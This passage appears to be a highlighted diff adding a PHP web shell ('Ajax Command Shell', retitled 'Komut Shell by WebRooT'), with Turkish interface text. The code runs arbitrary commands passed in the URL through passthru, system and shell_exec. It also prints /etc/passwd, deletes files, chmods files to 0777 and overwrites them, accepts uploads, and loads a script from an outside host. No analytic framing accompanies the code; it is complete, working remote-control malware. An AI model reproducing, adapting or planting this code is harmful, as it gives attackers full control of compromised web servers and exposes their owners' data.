+<span class="lineno">183</span>                     <span class="k">print</span> <span class="s2">&quot;&lt;i style=</span><span class="se">\&quot;</span><span class="s2">cursor:crosshair</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">deletefile(&#39;&quot;</span> <span class="o">.</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$directory</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;);</span><span class="se">\&quot;</span><span class="s2">&gt;[D]&lt;/i&gt;&lt;i style=</span><span class="se">\&quot;</span><span class="s2">cursor:crosshair</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">runcommand(&#39;changeworkdir &quot;</span> <span class="o">.</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$directory</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;,&#39;GET&#39;);</span><span class="se">\&quot;</span><span class="s2">&gt;[W]&lt;/i&gt;&lt;b style=</span><span class="se">\&quot;</span><span class="s2">cursor:crosshair</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">runcommand(&#39;clear&#39;,&#39;GET&#39;); runcommand (&#39;listdir &quot;</span> <span class="o">.</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$directory</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;,&#39;GET&#39;); </span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span> <span class="o">.</span> <span class="nv">$directory</span> <span class="o">.</span> <span class="s2">&quot;&lt;/b&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">184</span>                 <span class="p">}</span>
+<span class="lineno">185</span>                 <span class="k">print</span> <span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">186</span>                 <span class="k">foreach</span> <span class="p">(</span><span class="nv">$filez</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno">187</span>                     <span class="k">print</span> <span class="s2">&quot;&lt;i style=</span><span class="se">\&quot;</span><span class="s2">cursor:crosshair</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">deletefile(&#39;&quot;</span> <span class="o">.</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;);</span><span class="se">\&quot;</span><span class="s2">&gt;[D]&lt;/i&gt;&lt;u style=</span><span class="se">\&quot;</span><span class="s2">cursor:crosshair</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">runcommand(&#39;editfile &quot;</span> <span class="o">.</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;,&#39;GET&#39;);</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span> <span class="o">.</span> <span class="nv">$file</span> <span class="o">.</span> <span class="s2">&quot;&lt;/u&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">188</span>                 <span class="p">}</span>
+<span class="lineno">189</span>                 <span class="k">print</span> <span class="s2">&quot;&lt;/td&gt;&lt;/table&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">190</span>             <span class="p">}</span>
+<span class="lineno">191</span>         <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;about&quot;</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno">192</span>             <span class="k">print</span> <span class="s2">&quot;Ajax Command Shell by &lt;a href=http://www.ironwarez.info&gt;Ironfist&lt;/a&gt;.&lt;br&gt;Version </span><span class="si">$version</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">193</span>         <span class="p">}</span>
+<span class="lineno">194</span>         <span class="c1">//Show info</span>
+<span class="lineno">195</span>         <span class="k">elseif</span> <span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;showinfo&quot;</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno">196</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nb">disk_free_space</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">197</span>                 <span class="nv">$free</span> <span class="o">=</span> <span class="nb">disk_free_space</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span> <span class="o">/</span> <span class="mi">1000000</span><span class="p">;</span>
+<span class="lineno">198</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">199</span>                 <span class="nv">$free</span> <span class="o">=</span> <span class="s2">&quot;N/A&quot;</span><span class="p">;</span>
+<span class="lineno">200</span>             <span class="p">}</span>
+<span class="lineno">201</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nb">disk_total_space</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">202</span>                 <span class="nv">$total</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">disk_total_space</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span> <span class="o">/</span> <span class="mi">1000000</span><span class="p">);</span>
+<span class="lineno">203</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">204</span>                 <span class="nv">$total</span> <span class="o">=</span> <span class="s2">&quot;N/A&quot;</span><span class="p">;</span>
+<span class="lineno">205</span>             <span class="p">}</span>
+<span class="lineno">206</span>             <span class="nv">$path</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
+<span class="lineno">207</span>             <span class="k">print</span> <span class="s2">&quot;&lt;b&gt;Free:&lt;/b&gt; </span><span class="si">$free</span><span class="s2"> / </span><span class="si">$total</span><span class="s2"> MB&lt;br&gt;&lt;b&gt;Current path:&lt;/b&gt; </span><span class="si">$path</span><span class="s2">&lt;br&gt;&lt;b&gt;Uname -a Output:&lt;/b&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">208</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nb">passthru</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">209</span>                 <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;uname -a&quot;</span><span class="p">);</span>
+<span class="lineno">210</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">211</span>                 <span class="k">print</span> <span class="s2">&quot;Passthru is disabled :(&quot;</span><span class="p">;</span>
+<span class="lineno">212</span>             <span class="p">}</span>
+<span class="lineno">213</span>         <span class="p">}</span>
+<span class="lineno">214</span>         <span class="c1">//Read /etc/passwd</span>
+<span class="lineno">215</span>         <span class="k">elseif</span> <span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;etcpasswdfile&quot;</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno">216</span>             <span class="nv">$pw</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="s1">&#39;/etc/passwd/&#39;</span><span class="p">);</span>
+<span class="lineno">217</span>             <span class="k">foreach</span> <span class="p">(</span><span class="nv">$pw</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno">218</span>                 <span class="k">print</span> <span class="nv">$line</span><span class="p">;</span>
+<span class="lineno">219</span>             <span class="p">}</span>
+<span class="lineno">220</span>         <span class="p">}</span>
+<span class="lineno">221</span>         <span class="c1">//Execute any other command</span>
+<span class="lineno">222</span>         <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">223</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nb">passthru</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">224</span>                 <span class="nb">passthru</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+<span class="lineno">225</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">226</span>                 <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nb">exec</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">227</span>                     <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;ls -la&quot;</span><span class="p">,</span> <span class="nv">$result</span><span class="p">);</span>
+<span class="lineno">228</span>                     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$output</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno">229</span>                         <span class="k">print</span> <span class="nv">$output</span> <span class="o">.</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">230</span>                     <span class="p">}</span>
+<span class="lineno">231</span>                 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">232</span>                     <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nb">system</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">233</span>                         <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+<span class="lineno">234</span>                     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">235</span>                         <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nb">shell_exec</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">236</span>                             <span class="k">print</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+<span class="lineno">237</span>                         <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">238</span>                             <span class="k">print</span> <span class="s2">&quot;Sorry, none of the command functions works.&quot;</span><span class="p">;</span>
+<span class="lineno">239</span>                         <span class="p">}</span>
+<span class="lineno">240</span>                     <span class="p">}</span>
+<span class="lineno">241</span>                 <span class="p">}</span>
+<span class="lineno">242</span>             <span class="p">}</span>
+<span class="lineno">243</span>         <span class="p">}</span>
+<span class="lineno">244</span>     <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;savefile&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filetosave&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filecontent&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno">245</span>         <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filetosave&#39;</span><span class="p">];</span>
+<span class="lineno">246</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">247</span>             <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="mo">0777</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">248</span>                 <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Nope, can&#39;t chmod nor save :(&quot;</span><span class="p">);</span> <span class="c1">//In fact, nobody ever reads this message ^_^</span>
+<span class="lineno">249</span> 
+<span class="lineno">250</span>             <span class="p">}</span>
+<span class="lineno">251</span>         <span class="p">}</span>
+<span class="lineno">252</span>         <span class="nv">$fh</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
+<span class="lineno">253</span>         <span class="nv">$dt</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filecontent&#39;</span><span class="p">];</span>
+<span class="lineno">254</span>         <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fh</span><span class="p">,</span> <span class="nv">$dt</span><span class="p">);</span>
+<span class="lineno">255</span>         <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fh</span><span class="p">);</span>
+<span class="lineno">256</span>     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">257</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="lineno">258</span> <span class="x">&lt;html&gt;</span>
+<span class="lineno">259</span> <span class="x">&lt;title&gt;Komut Shell ~ </span><span class="cp">&lt;?php</span> <span class="k">print</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"> ~ by WebRooT&lt;/title&gt;</span>
+<span class="lineno">260</span> <span class="x">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1254&quot; /&gt;</span>
+<span class="lineno">261</span> <span class="x">&lt;head&gt;</span>
+<span class="lineno">262</span> <span class="cp">&lt;?php</span> <span class="k">print</span> <span class="nv">$style</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="lineno">263</span> <span class="x">&lt;SCRIPT TYPE=&quot;text/javascript&quot;&gt;</span>
+<span class="lineno">264</span> <span class="x">function sf(){document.cmdform.command.focus();}</span>
+<span class="lineno">265</span> <span class="x">var outputcmd = &quot;&quot;;</span>
+<span class="lineno">266</span> <span class="x">var cmdhistory = &quot;&quot;;</span>
+<span class="lineno">267</span> <span class="x">function ClearScreen()</span>
+<span class="lineno">268</span> <span class="x">{</span>
+<span class="lineno">269</span> <span class="x">    outputcmd = &quot;&quot;;</span>
+<span class="lineno">270</span> <span class="x">    document.getElementById(&#39;output&#39;).innerHTML = outputcmd;</span>
+<span class="lineno">271</span> <span class="x">}</span>
+<span class="lineno">272</span> 
+<span class="lineno">273</span> <span class="x">function ClearHistory()</span>
+<span class="lineno">274</span> <span class="x">{</span>
+<span class="lineno">275</span> <span class="x">    cmdhistory = &quot;&quot;;</span>
+<span class="lineno">276</span> <span class="x">    document.getElementById(&#39;history&#39;).innerHTML = cmdhistory;</span>
+<span class="lineno">277</span> <span class="x">}</span>
+<span class="lineno">278</span> 
+<span class="lineno">279</span> <span class="x">function deletefile(file)</span>
+<span class="lineno">280</span> <span class="x">{</span>
+<span class="lineno">281</span> <span class="x">    deleteit = window.confirm(&quot;Are you sure you want to delete</span>
+<span class="lineno">282</span> <span class="x">&quot;+file+&quot;?&quot;);</span>
+<span class="lineno">283</span> <span class="x">    if(deleteit)</span>
+<span class="lineno">284</span> <span class="x">    {</span>
+<span class="lineno">285</span> <span class="x">        runcommand(&#39;deletefile &#39; + file,&#39;GET&#39;);</span>
+<span class="lineno">286</span> <span class="x">    }</span>
+<span class="lineno">287</span> <span class="x">}</span>
+<span class="lineno">288</span> 
+<span class="lineno">289</span> <span class="x">var http_request = false;</span>
+<span class="lineno">290</span> <span class="x">function makePOSTRequest(url, parameters) {</span>
+<span class="lineno">291</span> <span class="x">  http_request = false;</span>
+<span class="lineno">292</span> <span class="x">  if (window.XMLHttpRequest) {</span>
+<span class="lineno">293</span> <span class="x">     http_request = new XMLHttpRequest();</span>
+<span class="lineno">294</span> <span class="x">     if (http_request.overrideMimeType) {</span>
+<span class="lineno">295</span> <span class="x">        http_request.overrideMimeType(&#39;text/html&#39;);</span>
+<span class="lineno">296</span> <span class="x">     }</span>
+<span class="lineno">297</span> <span class="x">  } else if (window.ActiveXObject) {</span>
+<span class="lineno">298</span> <span class="x">     try {</span>
+<span class="lineno">299</span> <span class="x">        http_request = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);</span>
+<span class="lineno">300</span> <span class="x">     } catch (e) {</span>
+<span class="lineno">301</span> <span class="x">        try {</span>
+<span class="lineno">302</span> <span class="x">           http_request = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span>
+<span class="lineno">303</span> <span class="x">        } catch (e) {}</span>
+<span class="lineno">304</span> <span class="x">     }</span>
+<span class="lineno">305</span> <span class="x">  }</span>
+<span class="lineno">306</span> <span class="x">  if (!http_request) {</span>
+<span class="lineno">307</span> <span class="x">     alert(&#39;Cannot create XMLHTTP instance&#39;);</span>
+<span class="lineno">308</span> <span class="x">     return false;</span>
+<span class="lineno">309</span> <span class="x">  }</span>
+<span class="lineno">310</span> 
+<span class="lineno">311</span> 
+<span class="lineno">312</span> <span class="x">  http_request.open(&#39;POST&#39;, url, true);</span>
+<span class="lineno">313</span> <span class="x">  http_request.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span>
+<span class="lineno">314</span> <span class="x">  http_request.setRequestHeader(&quot;Content-length&quot;, parameters.length);</span>
+<span class="lineno">315</span> <span class="x">  http_request.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);</span>
+<span class="lineno">316</span> <span class="x">  http_request.send(parameters);</span>
+<span class="lineno">317</span> <span class="x">}</span>
+<span class="lineno">318</span> 
+<span class="lineno">319</span> 
+<span class="lineno">320</span> <span class="x">function SaveFile()</span>
+<span class="lineno">321</span> <span class="x">{</span>
+<span class="lineno">322</span> <span class="x">var poststr = &quot;filetosave=&quot; + encodeURI( document.saveform.filetosave.value ) +</span>
+<span class="lineno">323</span> <span class="x">                    &quot;&amp;filecontent=&quot; + encodeURI( document.getElementById(&quot;area1&quot;).value );</span>
+<span class="lineno">324</span> <span class="x">makePOSTRequest(&#39;</span><span class="cp">&lt;?php</span> <span class="k">print</span> <span class="nv">$ThisFile</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">?savefile&#39;, poststr);</span>
+<span class="lineno">325</span> <span class="x">document.getElementById(&#39;output&#39;).innerHTML = document.getElementById(&#39;output&#39;).innerHTML + &quot;&lt;br&gt;&lt;b&gt;Saved! If it didn&#39;t save, you&#39;ll need to chmod the file to 777 yourself,&lt;br&gt; however the script tried to chmod it automaticly.&quot;;</span>
+<span class="lineno">326</span> <span class="x">}</span>
+<span class="lineno">327</span> 
+<span class="lineno">328</span> <span class="x">function runcommand(urltoopen,action,contenttosend){</span>
+<span class="lineno">329</span> <span class="x">cmdhistory = &quot;&lt;br&gt;&amp;nbsp;&lt;i style=\&quot;cursor:crosshair\&quot; onclick=\&quot;document.cmdform.command.value=&#39;&quot; + urltoopen + &quot;&#39;\&quot;&gt;&quot; + urltoopen + &quot;&lt;/i&gt; &quot; + cmdhistory;</span>
+<span class="lineno">330</span> <span class="x">document.getElementById(&#39;history&#39;).innerHTML = cmdhistory;</span>
+<span class="lineno">331</span> <span class="x">if(urltoopen == &quot;clear&quot;)</span>
+<span class="lineno">332</span> <span class="x">{</span>
+<span class="lineno">333</span> <span class="x">ClearScreen();</span>
+<span class="lineno">334</span> <span class="x">}</span>
+<span class="lineno">335</span> <span class="x">    var ajaxRequest;</span>
+<span class="lineno">336</span> <span class="x">    try{</span>
+<span class="lineno">337</span> <span class="x">        ajaxRequest = new XMLHttpRequest();</span>
+<span class="lineno">338</span> <span class="x">    } catch (e){</span>
+<span class="lineno">339</span> <span class="x">        try{</span>
+<span class="lineno">340</span> <span class="x">            ajaxRequest = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);</span>
+<span class="lineno">341</span> <span class="x">        } catch (e) {</span>
+<span class="lineno">342</span> <span class="x">            try{</span>
+<span class="lineno">343</span> <span class="x">                ajaxRequest = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span>
+<span class="lineno">344</span> <span class="x">            } catch (e){</span>
+<span class="lineno">345</span> <span class="x">                alert(&quot;Wicked error, nothing we can do about it...&quot;);</span>
+<span class="lineno">346</span> <span class="x">                return false;</span>
+<span class="lineno">347</span> <span class="x">            }</span>
+<span class="lineno">348</span> <span class="x">        }</span>
+<span class="lineno">349</span> <span class="x">    }</span>
+<span class="lineno">350</span> <span class="x">    ajaxRequest.onreadystatechange = function(){</span>
+<span class="lineno">351</span> <span class="x">        if(ajaxRequest.readyState == 4){</span>
+<span class="lineno">352</span> <span class="x">        outputcmd = &quot;&lt;pre&gt;&quot;  + outputcmd + ajaxRequest.responseText +&quot;&lt;/pre&gt;&quot;;</span>
+<span class="lineno">353</span> <span class="x">            document.getElementById(&#39;output&#39;).innerHTML = outputcmd;</span>
+<span class="lineno">354</span> <span class="x">            var objDiv = document.getElementById(&quot;output&quot;);</span>
+<span class="lineno">355</span> <span class="x">            objDiv.scrollTop = objDiv.scrollHeight;</span>
+<span class="lineno">356</span> <span class="x">        }</span>
+<span class="lineno">357</span> <span class="x">    }</span>
+<span class="lineno">358</span> <span class="x">    ajaxRequest.open(action, &quot;?runcmd=&quot;+urltoopen , true);</span>
+<span class="lineno">359</span> <span class="x">    if(action == &quot;GET&quot;)</span>
+<span class="lineno">360</span> <span class="x">    {</span>
+<span class="lineno">361</span> <span class="x">    ajaxRequest.send(null);</span>
+<span class="lineno">362</span> <span class="x">    }</span>
+<span class="lineno">363</span> <span class="x">    document.cmdform.command.value=&#39;&#39;;</span>
+<span class="lineno">364</span> <span class="x">    return false;</span>
+<span class="lineno">365</span> <span class="x">}</span>
+<span class="lineno">366</span> 
+<span class="lineno">367</span> <span class="x">function set_tab_html(newhtml)</span>
+<span class="lineno">368</span> <span class="x">{</span>
+<span class="lineno">369</span> <span class="x">document.getElementById(&#39;commandtab&#39;).innerHTML = newhtml;</span>
+<span class="lineno">370</span> <span class="x">}</span>
+<span class="lineno">371</span> 
+<span class="lineno">372</span> <span class="x">function set_tab(newtab)</span>
+<span class="lineno">373</span> <span class="x">{</span>
+<span class="lineno">374</span> <span class="x">    if(newtab == &quot;cmd&quot;)</span>
+<span class="lineno">375</span> <span class="x">    {</span>
+<span class="lineno">376</span> <span class="x">        newhtml = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;form name=&quot;cmdform&quot; onsubmit=&quot;return runcommand(document.cmdform.command.value,\&#39;GET\&#39;);&quot;&gt;&lt;b&gt;Command&lt;/b&gt;: &lt;input type=text name=command class=cmdthing size=100%&gt;&lt;br&gt;&lt;/form&gt;&#39;;</span>
+<span class="lineno">377</span> <span class="x">    }</span>
+<span class="lineno">378</span> <span class="x">    else if(newtab == &quot;upload&quot;)</span>
+<span class="lineno">379</span> <span class="x">    {</span>
+<span class="lineno">380</span> <span class="x">        runcommand(&#39;upload&#39;,&#39;GET&#39;);</span>
+<span class="lineno">381</span> <span class="x">        newhtml = &#39;&lt;font size=0&gt;&lt;b&gt;Sayfa Yenilenecek...&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">print</span> <span class="nv">$ThisFile</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;10000000&quot; /&gt;Dosya se: &lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt;&lt;/form&gt;&lt;/font&gt;&#39;;</span>
+<span class="lineno">382</span> <span class="x">    }</span>
+<span class="lineno">383</span> <span class="x">    else if(newtab == &quot;workingdir&quot;)</span>
+<span class="lineno">384</span> <span class="x">    {</span>
+<span class="lineno">385</span> <span class="x">        </span><span class="cp">&lt;?php</span>
+<span class="lineno">386</span>         <span class="nv">$folders</span> <span class="o">=</span> <span class="s2">&quot;&lt;form name=workdir onsubmit=</span><span class="se">\&quot;</span><span class="s2">return runcommand(\&#39;changeworkdir \&#39; + document.workdir.changeworkdir.value,\&#39;GET\&#39;);</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input size=80% type=text name=changeworkdir value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">387</span>         <span class="nv">$pathparts</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">));</span>
+<span class="lineno">388</span>         <span class="k">foreach</span> <span class="p">(</span><span class="nv">$pathparts</span> <span class="k">as</span> <span class="nv">$folder</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno">389</span>             <span class="nv">$folders</span><span class="o">.=</span> <span class="nv">$folder</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
+<span class="lineno">390</span>         <span class="p">}</span>
+<span class="lineno">391</span>         <span class="nv">$folders</span><span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;input type=submit value=Change&gt;&lt;/form&gt;&lt;br&gt;Script directory: &lt;i style=</span><span class="se">\&quot;</span><span class="s2">cursor:crosshair</span><span class="se">\&quot;</span><span class="s2">  onclick=</span><span class="se">\&quot;</span><span class="s2">document.workdir.changeworkdir.value=\&#39;&quot;</span> <span class="o">.</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;\&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;/i&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">392</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="lineno">393</span> <span class="x">        newhtml = &#39;</span><span class="cp">&lt;?php</span> <span class="k">print</span> <span class="nv">$folders</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&#39;;</span>
+<span class="lineno">394</span> <span class="x">    }</span>
+<span class="lineno">395</span> <span class="x">    else if(newtab == &quot;filebrowser&quot;)</span>
+<span class="lineno">396</span> <span class="x">    {</span>
+<span class="lineno">397</span> <span class="x">        newhtml = &#39;&lt;b&gt;File browser is under construction! Use at your own risk!&lt;/b&gt; &lt;br&gt;You can use it to change your working directory easily, don\&#39;t expect too much of it.&lt;br&gt;Click on a file to edit it.&lt;br&gt;&lt;i&gt;[W]&lt;/i&gt; = set directory as working directory.&lt;br&gt;&lt;i&gt;[D]&lt;/i&gt; = delete file/directory&#39;;</span>
+<span class="lineno">398</span> <span class="x">        runcommand(&#39;listdir .&#39;,&#39;GET&#39;);</span>
+<span class="lineno">399</span> <span class="x">    }</span>
+<span class="lineno">400</span> <span class="x">    else if(newtab == &quot;createfile&quot;)</span>
+<span class="lineno">401</span> <span class="x">    {</span>
+<span class="lineno">402</span> <span class="x">        newhtml = &#39;&lt;b&gt;File Editor, under construction.&lt;/b&gt;&#39;;</span>
+<span class="lineno">403</span> <span class="x">        document.getElementById(&#39;output&#39;).innerHTML = &quot;&lt;form name=\&quot;saveform\&quot;&gt;&lt;textarea cols=70 rows=10 id=\&quot;area1\&quot;&gt;&lt;/textarea&gt;&lt;br&gt;&lt;input size=80 type=text name=filetosave value=\&quot;</span><span class="cp">&lt;?php</span> <span class="k">print</span> <span class="nb">realpath</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span> <span class="o">.</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span> <span class="mi">999999</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;.txt&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">\&quot;&gt;&lt;input value=\&quot;Save\&quot; type=button onclick=\&quot;SaveFile();\&quot;&gt;&lt;/form&gt;&quot;;</span>
+<span class="lineno">404</span> 
+<span class="lineno">405</span> <span class="x">    }</span>
+<span class="lineno">406</span> <span class="x">        document.getElementById(&#39;commandtab&#39;).innerHTML = newhtml;</span>
+<span class="lineno">407</span> <span class="x">}</span>
+<span class="lineno">408</span> <span class="x">&lt;/script&gt;</span>
+<span class="lineno">409</span> <span class="x">&lt;/head&gt;</span>
+<span class="lineno">410</span> <span class="x">&lt;body bgcolor=black onload=&quot;sf();&quot; vlink=white alink=white link=white&gt;</span>
+<span class="lineno">411</span> <span class="x">&lt;table border=1 width=100% height=100%&gt;</span>
+<span class="lineno">412</span> <span class="x">&lt;td width=15% valign=top&gt;</span>
+<span class="lineno">413</span> <span class="x">&lt;SCRIPT SRC=http://www.r57.gen.tr/yazciz/ciz.js&gt;&lt;/SCRIPT&gt;</span>
+<span class="lineno">414</span> <span class="x">&lt;form name=&quot;extras&quot;&gt;&lt;br&gt;</span>
+<span class="lineno">415</span> <span class="x">&lt;center&gt;&lt;b&gt;Hizli Komutlar&lt;/b&gt;&lt;br&gt;</span>
+<span class="lineno">416</span> 
+<span class="lineno">417</span> <span class="x">&lt;div style=&#39;margin: 0px;padding: 0px;border: 1px inset;overflow: auto&#39;&gt;</span>
+<span class="lineno">418</span> <span class="cp">&lt;?php</span>
+<span class="lineno">419</span>         <span class="k">foreach</span> <span class="p">(</span><span class="nv">$functions</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$execute</span><span class="p">)</span> <span class="p">{</span>
